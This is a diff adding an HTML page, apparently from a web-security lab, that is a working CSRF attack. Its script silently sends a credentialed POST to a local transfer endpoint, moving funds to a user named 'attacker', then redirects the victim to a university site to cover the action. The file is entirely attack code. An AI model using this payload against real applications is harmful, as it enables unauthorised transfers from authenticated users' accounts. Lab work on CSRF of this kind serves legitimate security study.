@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <script>
+      var x = new XMLHttpRequest();
+      x.open("POST", "http://localhost:3000/post_transfer", false);
+      x.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+      x.withCredentials = true;
+      try {
+        x.send("quantity=10&destination_username=attacker");
+      } catch (err) {} finally {
+        window.location = "http://www.unsa.edu.pe";
+      }
+    </script>
+  </body>
+</html>
